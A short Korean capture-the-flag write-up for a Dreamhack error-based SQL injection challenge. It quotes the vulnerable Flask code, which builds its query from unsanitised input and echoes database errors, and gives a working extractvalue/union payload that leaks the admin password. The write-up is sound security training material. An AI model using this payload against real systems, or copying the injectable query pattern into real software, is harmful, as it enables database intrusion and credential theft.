# Challenge: dreamhack - error based sql injection

## 문제 설명 & 접근
https://dreamhack.io/wargame/challenges/412/


## 문제 풀이
step 1
* app.py를 보면 결과를 보여주지 않고, 에러만 표시하는 것을 알 수 있다. 따라서 error based sql injection을 써보자.
    ```python
    @app.route('/', methods=['POST', 'GET'])
    def index():
        uid = request.args.get('uid')
        if uid:
            try:
                cur = mysql.connection.cursor()
                cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
                return template.format(uid=uid)
            except Exception as e:
                return str(e)
        else:
            return template
    ```
* 필자는 extractvalue를 이용하였다. admin'으로 현 select 구문을 닫아주고 union select에 (extractvalue, 1, 1) 을 붙여주었다. user table의 column이 3개이기 때문. 하지만 바로 upw를 출력하면 에러 메시지에 일부만 나오고 나머지는 잘려서 보이지 않는다. 따라서 두번 나눠서 코드를 써주면 플래그를 얻어낼 수 있다.
    ```python
    uid = f"admin' union select extractvalue(1,concat(0x3a, (select substr(upw,1,20) from user where uid='admin'))),1,1 -- " 
    ```

## 결과
blindsql.py에 익스플로잇 코드를 넣어두었다. 실행하면 플래그를 얻을 수 있다.